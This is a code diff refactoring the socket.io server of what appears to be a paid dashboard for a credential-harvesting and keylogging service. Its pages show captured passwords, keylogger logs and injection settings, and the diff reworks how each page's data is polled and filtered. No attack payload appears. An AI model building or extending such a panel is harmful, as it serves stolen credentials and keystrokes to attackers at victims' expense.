@@ -47,10 +47,11 @@ MongoClient.connect(config.mongodb, (err, client) => {
 
   io.on('connection', socket => {
     let globalToken
-    let refresh
-    let prevState
     let injectWatcher
-    let type
+    let state = {
+      previous: '',
+      page: ''
+    }
     var getToken = code => {
       return new Promise((resolve, reject) => {
         if (!code) {
@@ -416,8 +417,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
 
     socket.on('auth:signout', data => {
       globalToken = ''
-      prevState = ''
-      refresh = ''
+      state = {}
       if (injectWatcher) {
         inject.watchers[injectWatcher] = inject.watchers[injectWatcher].filter(watcher => {
           return watcher.id !== socket.id
@@ -513,70 +513,59 @@ MongoClient.connect(config.mongodb, (err, client) => {
       }
     })
 
-    socket.on('project:read', project => {
-      if (project.name && globalToken) {
-        if (project.type === 'overview' || project.type === 'passwords' || project.type === 'keylogger' || project.type === 'inject' || project.type === 'config') {
-          type = project.type
+    socket.on('project:read', data => {
+      let { project, page } = data
+      let pages = ['overview', 'passwords', 'keylogger', 'inject', 'config']
+
+      if (globalToken) {
+        if (project && page && pages.includes(page)) {
+          state.page = page
+          state.project = project
           getUser(globalToken).then(user => {
-            getProject(project.name, user).then(thisProject => {
-              if (project.type === 'overview' || project.type === 'config') {
-                // Remove the passwords, inject & keylogger from the cloned object
-                delete thisProject.doc.passwords
-                delete thisProject.doc.inject
-                delete thisProject.doc.keylogger
-                socket.emit('project:read', {
-                  type: project.type,
-                  doc: thisProject.doc
-                })
-              } else {
-                socket.emit('project:read', {
-                  type: project.type,
-                  doc: thisProject.doc[project.type]
-                })
-              }
-              prevState = JSON.stringify(thisProject.doc)
-              database(user).then(doc => {
-                let timeout = 1000
-                // if (doc.payment.account_type.toLowerCase() != "free") {
-                if (doc.payment.account_type.toLowerCase() === 'elite') timeout = 100
-                clearInterval(refresh)
-                getProject(project.name, user).then(thisProject => {
-                  refresh = setInterval(() => {
-                    getProject(project.name, user).then(thisProject => {
-                      let data = thisProject.doc
-                      if (type === 'overview' || type === 'config') {
-                        delete data.passwords
-                        delete data.keylogger
-                        delete data.inject
-                      } else if (type) {
-                        data = data[type]
-                      }
-                      if (JSON.stringify(data) === prevState) return
-                      socket.emit('project:read', {
-                        type: type,
-                        doc: data
-                      })
-                      prevState = JSON.stringify(data)
-                    }).catch(e => {
-                      socket.emit('err', {
-                        title: e.title,
-                        message: e.message
-                      })
+            /**
+             * Fetch the user from the database
+             */
+            database(user).then(dbUser => {
+              (function check () {
+                /**
+                 * Make sure they are still on the same page and same project
+                 */
+                if (state.page !== page || state.project !== project) return
+                /**
+                 * Fetch the project from the database
+                 */
+                getProject(project, user).then(doc => {
+                  doc = doc.doc
+                  /**
+                   * Iterates over the pages array and removes elements
+                   * from the doc that don't match the requested page
+                   */
+                  for (let p of pages) {
+                    if (p !== page) {
+                      delete doc[p]
+                    }
+                  }
+
+                  let currentState = JSON.stringify(doc)
+                  if (state.previous !== currentState) {
+                    state.previous = currentState
+                    socket.emit('project:read', {
+                      page: page,
+                      doc: doc
                     })
-                  }, timeout)
+                  }
+                  /**
+                   * Check
+                   */
+                  setTimeout(check, 1000)
                 }).catch(e => {
+                  // User doesn't have permission access the project
                   socket.emit('err', {
                     title: e.title,
                     message: e.message
                   })
                 })
-                // }
-              })
-            }).catch(e => {
-              socket.emit('err', {
-                title: e.title,
-                message: e.message
-              })
+              })()
             })
           }).catch(error => {
             // Failed to authenticate user with token
@@ -908,7 +897,8 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 }
                 if (data.newName === thisProject.doc.name) return
                 renameProject(user, thisProject, data.newName).then(response => {
-                  clearInterval(refresh)
+                  state.project = ''
+                  state.page = ''
                   socket.emit('project:switch', {
                     project: data.newName
                   })
@@ -1082,7 +1072,8 @@ MongoClient.connect(config.mongodb, (err, client) => {
     })
 
     socket.on('project:close', data => {
-      clearInterval(refresh)
+      state.project = ''
+      state.page = ''
     })
 
     socket.on('inject:close', data => {
@@ -1099,7 +1090,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
           return watcher.id !== socket.id
         })
       }
-      clearInterval(refresh)
+      state = {}
     })
   })
 
